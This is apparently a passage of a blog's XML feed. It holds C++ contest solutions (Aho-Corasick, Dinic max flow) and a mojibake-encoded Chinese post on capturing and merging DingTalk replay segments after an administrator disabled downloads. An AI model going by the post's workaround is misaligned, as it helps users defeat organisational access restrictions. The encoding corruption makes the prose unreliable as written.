class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e6</span> + <span class="number">5</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> word;<span class="keyword">int</span> deg,val;</span><br><span class="line">    node *fail , *next[<span class="number">26</span>];</span><br><span class="line">    <span class="built_in">node</span>() &#123;</span><br><span class="line">        word = deg = val = <span class="number">0</span>;fail = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++)</span><br><span class="line">            next[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;*ext=(node*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node)*maxn),*root;</span><br><span class="line"></span><br><span class="line">queue&lt;node*&gt; Q;</span><br><span class="line"><span class="keyword">char</span> t[maxn], word[maxn];<span class="keyword">int</span> num[maxn],ans[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> node* <span class="title">Ot</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> *ext=<span class="built_in">node</span>(),ext++;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    node* p = root;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> k = word[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next[k] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            p-&gt;next[k] = <span class="built_in">Ot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!p-&gt;word) &#123;</span><br><span class="line">        p-&gt;word = x;</span><br><span class="line">    &#125;</span><br><span class="line">    num[x] = p-&gt;word;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++) <span class="keyword">if</span>(root-&gt;next[i]) root-&gt;next[i]-&gt;fail=root,Q.<span class="built_in">push</span>(root-&gt;next[i]); <span class="keyword">else</span> root-&gt;next[i]=root;</span><br><span class="line">    <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        node* p = Q.<span class="built_in">front</span>();Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// printf(&quot;%ld\n&quot;,p-root);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next[i]) &#123;</span><br><span class="line">                p-&gt;next[i]-&gt;fail = p-&gt;fail-&gt;next[i],p-&gt;fail-&gt;next[i]-&gt;deg++;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;next[i]!=root) Q.<span class="built_in">push</span>(p-&gt;next[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> p-&gt;next[i] = p-&gt;fail-&gt;next[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="comment">// printf(&quot;len:%d\n&quot;,len);</span></span><br><span class="line">    node* p = root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;i:%d p:%ld np:%ld\n&quot;,i,p-root,p-&gt;next[t[i]-&#x27;a&#x27;]);</span></span><br><span class="line">        <span class="keyword">int</span> k = t[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        p=p-&gt;next[k];p-&gt;val++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// puts(&quot;OUT&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">topo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(node *i=root;i&lt;ext;i++) <span class="keyword">if</span>(!i-&gt;deg) Q.<span class="built_in">push</span>(i);</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=Q.<span class="built_in">front</span>();Q.<span class="built_in">pop</span>();ans[p-&gt;word]=p-&gt;val;</span><br><span class="line">        <span class="comment">// printf(&quot;p:%ld\n&quot;,p-root);</span></span><br><span class="line">        <span class="keyword">if</span>(p!=root)&#123;</span><br><span class="line">            p-&gt;fail-&gt;val += p-&gt;val;</span><br><span class="line">            <span class="keyword">if</span>(--p-&gt;fail-&gt;deg==<span class="number">0</span>) Q.<span class="built_in">push</span>(p-&gt;fail);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);root=<span class="built_in">Ot</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, word);</span><br><span class="line">        <span class="built_in">insert</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build_fail</span>();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, t);</span><br><span class="line">    <span class="built_in">query</span>();<span class="built_in">topo</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        cout&lt;&lt;ans[num[i]]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å­—ç¬¦ä¸² </category>
          
          <category> ACè‡ªåŠ¨æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœ€å°è´¹ç”¨æœ€å¤§æµåº”ç”¨</title>
      <link href="/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/"/>
      <url>/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>ä¸€é“å°æ€ç»´é¢˜</p><span id="more"></span><p>é¢˜ç›®æè¿°</p><p><img src="/2022/04/02/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E5%BA%94%E7%94%A8/1.png" alt="1"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6000</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    </span><br><span class="line">&#125;e[maxn*<span class="number">3000</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt=<span class="number">1</span>,dep[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,q,x,y;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;que;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0</span>, w = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">char</span> ch = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) w = <span class="number">-1</span>;        </span><br><span class="line">    ch = <span class="built_in">getchar</span>();               </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;  </span><br><span class="line">    x = x * <span class="number">10</span> + (ch - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    ch = <span class="built_in">getchar</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x * w; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    e[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="built_in">size</span>())que.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="built_in">memset</span>(dep,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dep));</span><br><span class="line">    dep[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    que.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=e[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> w=e[i].w,v=e[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!w||dep[v])<span class="keyword">continue</span>;</span><br><span class="line">            dep[v]=dep[u]+<span class="number">1</span>;</span><br><span class="line">            que.<span class="built_in">push</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[<span class="number">2</span>*n+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Dinic</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u==<span class="number">2</span>*n+<span class="number">1</span>)<span class="keyword">return</span> in;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=e[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">        <span class="keyword">if</span>(dep[v]&gt;dep[u]&amp;&amp;w)&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">Dinic</span>(v,<span class="built_in">min</span>(in,w));</span><br><span class="line">            e[i].w-=res;</span><br><span class="line">            e[i^<span class="number">1</span>].w+=res;</span><br><span class="line">            in-=res;</span><br><span class="line">            ans+=res;</span><br><span class="line">            <span class="keyword">if</span>(!in)<span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0</span>)dep[u]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    n=<span class="built_in">rd</span>();</span><br><span class="line">    m=<span class="built_in">rd</span>();</span><br><span class="line">    q=<span class="built_in">rd</span>();</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,x,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(x,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">add</span>(i,i+n,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(i+n,i,<span class="number">0</span>);</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="keyword">while</span>(x--)&#123;</span><br><span class="line">            y=<span class="built_in">rd</span>();</span><br><span class="line">            <span class="built_in">add</span>(i+n,y,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">add</span>(y,i+n,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        x=<span class="built_in">rd</span>();</span><br><span class="line">        <span class="built_in">add</span>(x+n,<span class="number">2</span>*n+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">2</span>*n+<span class="number">1</span>,x+n,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        ans+=<span class="built_in">Dinic</span>(<span class="number">0</span>,<span class="number">0x7fffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> æœ€å°è´¹ç”¨æœ€å¤§æµ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºé’‰é’‰ä¿å­˜å›æ”¾çš„æ–¹å¼</title>
      <link href="/2022/03/20/Dingtalk/"/>
      <url>/2022/03/20/Dingtalk/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘éœ€è¦ä¸‹è½½é’‰é’‰çš„å½•å±å›æ”¾ï¼Œä½†æ˜¯ç®¡ç†å‘˜ç¦æ­¢äº†ä¸‹è½½ï¼Œæ‰¾åˆ°äº†ä¼—å¤šçš„æ–¹æ³•éƒ½ä¸å¾—è¡Œï¼Œåé¢è‡ªå·±å¼€è¾Ÿäº†ä¸€ä¸ªæ–¹æ³•ï¼ˆæˆ‘ä¹Ÿä¸æ•¢ç¡®å®šæ˜¯ä¸æ˜¯æ²¡æœ‰äººç”¨è¿™ä¸ªæ–¹æ³•ï¼Œåæ­£è¿™ä¸ªæ–¹æ³•ä¸æ˜¯é€šè¿‡æœç´¢å¾—åˆ°çš„ã€‚ã€‚</p><span id="more"></span><p>å…ˆè¯´è¯´æˆ‘é€šè¿‡æœç´¢èµ„æºå¾—åˆ°äº†äº›ä»€ä¹ˆæ–¹æ³•å§ï¼Œå…¶å®å¤§å¤šæ•°å°±æŒ‡å‘ä¸€ç§æ–¹æ³•â€”â€”é€šè¿‡fdæŠ“åŒ…æ‰¾åˆ°m3u8çš„ä¸‹è½½åœ°å€ï¼Œç„¶è€Œæˆ‘åœ¨ç”¨fdæŠ“åŒ…çš„æ—¶å€™å¹¶æ²¡æœ‰æ‰¾åˆ°m3u8çš„ä¸‹è½½åœ°å€ï¼Œä¹Ÿæœ‰è¯´ç”¨æ—§ç‰ˆæœ¬çš„é’‰é’‰çš„ï¼Œä½†æ˜¯æˆ‘å‘ç°æ ¹æœ¬æ‰«ä¸ä¸Šå»ï¼Œäºæ˜¯æˆ‘ä»”ç»†è§‚å¯Ÿfdå¾—åˆ°çš„åŒ…ï¼Œå‘ç°æ’­æ”¾è§†é¢‘çš„æ—¶å€™å¤§éƒ¨åˆ†å‡ºç°äº† .TSæ–‡ä»¶æ ¼å¼çš„urlè¯·æ±‚ã€‚</p><p><img src="/2022/03/20/Dingtalk/1.png" alt="1"></p><p>å¯ä»¥çœ‹åˆ°æ¯è¿‡ä¸€ä¼šå°±ä¼šè¯·æ±‚ä¸€ä¸ªå¯¹åº”çš„ <code>ts</code> æ–‡ä»¶ï¼Œæˆ‘ä¹Ÿå»æœäº†ä¸€ä¸‹ <code>ts</code> æ–‡ä»¶çš„å«ä¹‰ï¼Œå·®ä¸å¤šå°±æ˜¯è§†é¢‘çš„åˆ‡ç‰‡ã€‚å› æ­¤å¦‚æœæˆ‘èƒ½å¾—åˆ°æ‰€æœ‰çš„tsçš„ä¸‹è½½åœ°å€ï¼Œé‚£ä¹ˆæˆ‘å°±ç›¸å½“äºå¾—åˆ°äº†è¿™ä¸ªè§†é¢‘ã€‚</p><p>ä½†æ˜¯åœ¨è¯·æ±‚è¿™ä¸ª <code>ts</code> æ–‡ä»¶çš„æ—¶å€™å¿…é¡»åŠ ä¸Šä¸€ä¸ª <code>auth_key</code> å‚æ•°ï¼Œç„¶åè¿™ä¸ªå‚æ•°è²Œä¼¼ä¹Ÿæ˜¯ä¸ªéšæœºçš„æ•£åˆ—å€¼ï¼Œç›®å‰ä¿¡æ¯æœ‰é™æ²¡åŠæ³•è®¡ç®—å‡ºè¿™ä¸ªæ•£åˆ—å€¼çš„æ’å¸ƒè§„å¾‹ï¼Œä½†æ˜¯æˆ‘èƒ½å¾—åˆ°ä¸€ä¸ªæœ€æœ´ç´ çš„åšæ³•ï¼šæš´åŠ›å¾—åˆ°æ‰€æœ‰çš„ <code>ts</code> çš„urlï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªä¸‹è½½ï¼Œæœ€åç”¨ <code>ffmpeg</code> å»åˆå¹¶å°±å¥½äº†ã€‚</p><p>ç„¶è€Œè¿™é‡Œæˆ‘ä»¬å¹¶ä¸éœ€è¦çœ‹å®Œæ‰€æœ‰çš„è§†é¢‘ï¼Œæˆ‘ä»¬å¯ä»¥å¿«è¿›ï¼Œæˆ‘ç†è§£çš„åŸç†æ˜¯è¿™æ ·çš„ï¼šå‡å¦‚æŠŠä½ çš„è§†é¢‘åˆ‡æˆ 20Sä¸€ç‰‡ï¼Œåœ¨ä½ éœ€è¦çš„æ—¶å€™è¯·æ±‚ï¼Œç„¶è€Œå‡å¦‚æˆ‘ä¸çœ‹å®Œï¼Œç›´æ¥è·³è¿‡è¿™ä¸ªè¯·æ±‚ï¼Œé‚£ä¹ˆå®ƒé©¬ä¸Šå°±ä¼šè¯·æ±‚ä¸‹ä¸€ä¸ªè§†é¢‘çš„åœ°å€ï¼Œç„¶åæ­¤æ—¶è¢«æˆ‘ä»¬æ•è·åˆ°äº†ï¼Œä¹‹åå¾ªç¯å¾€å¤æˆ‘ä»¬å°±èƒ½å¿«é€Ÿåœ°å¾—åˆ°æ‰€æœ‰çš„è¯·æ±‚urlï¼Œè¿™é‡Œçš„è¯ä»…å¤åˆ¶urlå¯ä»¥å¿«é€ŸæŠŠurlå…¨éƒ¨å¤åˆ¶è¿‡æ¥ã€‚</p><p>è¿™é‡Œæˆ‘é€‰æ‹©æŒ‰é”®æ¨¡æ‹Ÿå™¨å»ç‚¹å‡»è¿™ä¸ªå³é”®æ’­æ”¾ï¼Œç„¶åé—´éš”é¢‘ç‡è®¾ç½®æˆ0.2Sï¼Œæ¯çœ‹1Sè·³è¿‡50Sï¼Œç›¸å½“äºå¿«è¿›50å€ï¼Œä¸€ä¸ª50minçš„è§†é¢‘æˆ‘ä»¬åœ¨1minå°±èƒ½æ•´å®Œï¼Œè¿™ä¸ªæ•ˆç‡è¿˜æ˜¯ä¸é”™çš„ï¼Œå¦‚æœå‘ç°tsæœ‰ä¸¢å¤±é‚£ä¹ˆä½ å¯ä»¥å®šä½åˆ°é‚£ä¸ªåœ°æ–¹é‡æ–°è§‚å¯Ÿä¸€ä¸‹è¯·æ±‚ï¼Œç„¶åurlå¤åˆ¶è¿‡æ¥ã€‚</p><p><img src="/2022/03/20/Dingtalk/2.png" alt="2"></p><p>æˆ‘æœ¬æ¥æƒ³è¿™ä¹ˆå¤šurlç”¨çˆ¬è™«è¯»å–urlä¸€ä¸ªä¸ªçˆ¬ç„¶åä¿å­˜çš„ï¼Œç»“æœä¸çŸ¥é“ä¸ºå•¥æŠ¥é”™äº†ï¼Œäºæ˜¯æˆ‘é€‰æ‹©æœ€è ¢çš„åŠæ³•ï¼šcmdå‘½ä»¤ã€‚</p><p>åœ¨æ‰€æœ‰urlå‰åŠ ä¸Šstartï¼Œç„¶ååç¼€æ”¹ä¸€ä¸‹batï¼Œä¸ºäº†é˜²æ­¢ç”µè„‘å¡é¡¿ï¼Œåœ¨æ¯ä¸€ä¸ªstartå‰åŠ ä¸Šä¸€ä¸ªæš‚åœçš„å‘½ä»¤ï¼Œç„¶åæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶ï¼š</p><p><img src="/2022/03/20/Dingtalk/3.png" alt="3"></p><p>æœ€åå°±æ˜¯æ¯ç‡¥çš„è¯·æ±‚äº†ï¼Œè¿™ä¸ªç­‰ç€å§ï¼Œå¦‚æœä½ è§‰å¾—ç”µè„‘holdçš„ä½é‚£ä¹ˆä½ å¯ä»¥ä¸åŠ æš‚åœçš„ï¼Œå®ƒä¼šå‘¨æœŸå¼¹ç½‘é¡µå‡ºæ¥ï¼Œæƒ…å†µå°±æ˜¯è¿™æ ·å­çš„ï¼š</p><p><img src="/2022/03/20/Dingtalk/4.png" alt="4"></p><p>æˆ‘è¿˜å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å®ƒæœ‰æ—¶å€™è¿™ä¸ªå›æ”¾å¹¶ä¸æ˜¯ä¸¥æ ¼çš„å°±æ˜¯æ­£æ•´æ•°é€’å¢çš„ï¼Œä¸­é—´æˆ‘æœ‰é‡åˆ°è¿‡é‚£ç§ <code>10000001.ts</code> çš„æ–‡ä»¶ï¼Œå°±æ˜¯çªç„¶è¿™æ ·çš„ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œæ‰€ä»¥æœ€åå†™åˆå¹¶æŒ‡ä»¤çš„æ—¶å€™ä¹Ÿæ¯”è¾ƒéš¾ï¼Œä½†æ˜¯éš¾å¤„åƒåƒä¸‡ï¼Œé è‡ªå·±è¿˜æ˜¯èƒ½è§£å†³çš„ã€‚é€‰æ‹©ç›´æ¥åœ¨é‡Œé¢æ”¾ä¸€ä¸ªpythonè„šæœ¬è‡ªåŠ¨åˆå¹¶ï¼Œåˆå¹¶çš„å‘½ä»¤æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i &quot;concat:æ–‡ä»¶1|æ–‡ä»¶2|æ–‡ä»¶3|â€¦â€¦|æ–‡ä»¶n&quot; -c copy output.mp4</span><br></pre></td></tr></table></figure><p>é‡Œé¢ä¸»è¦çš„å°±æ˜¯è¦æ‰«ä¸€ä¸‹ç›®å½•è·å–æ‰€æœ‰çš„æ–‡ä»¶åå¹¶è®©ä»–ä»¬æŒ‰ä¸€å®šé¡ºåºæ’åˆ—ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿç›´æ¥æ”¾ä¸€ä¸‹å§ï¼Œä¹ŸæŒºç®€å•çš„ï¼Œæ²¡ä»€ä¹ˆéœ€è¦è§£é‡Šçš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f=os.listdir(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">num=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">2</span>:]!=<span class="string">&#x27;ts&#x27;</span>:<span class="keyword">continue</span></span><br><span class="line">    num.append(<span class="built_in">int</span>(i[:-<span class="number">3</span>]))</span><br><span class="line">num.sort()</span><br><span class="line">fi=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span 